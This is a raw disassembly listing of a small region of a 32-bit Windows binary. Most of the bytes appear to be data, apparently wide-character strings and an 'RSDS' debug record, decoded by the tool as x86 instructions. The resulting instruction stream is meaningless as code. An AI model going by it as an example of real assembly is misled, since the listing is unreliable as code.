  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	daa    
  43398e:	test   eax,0xfce5a58e
  433993:	xor    eax,0xb9b2b148
  433998:	sbb    al,0x81
  43399a:	inc    eax
  43399b:	ror    BYTE PTR [ecx+0xe],cl
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
